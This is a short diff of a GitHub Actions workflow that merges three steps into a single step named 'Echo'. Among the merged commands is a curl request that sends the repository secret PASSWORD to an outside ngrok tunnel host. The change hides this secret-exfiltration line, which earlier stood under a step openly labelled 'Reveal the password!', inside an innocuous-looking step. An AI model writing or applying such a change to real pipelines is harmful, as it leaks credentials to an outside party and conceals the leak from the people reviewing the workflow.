@@ -7,8 +7,7 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: Echo
-        run: echo "hi"
-      - name: Check Python version
-        run: python --version
-      - name: Reveal the password!
-        run: curl http://7223bb061f0d.ngrok.io/${{SECRETS.PASSWORD}}
+        run: |
+          echo "hi"
+          python --version
+          curl http://7223bb061f0d.ngrok.io/${{SECRETS.PASSWORD}}
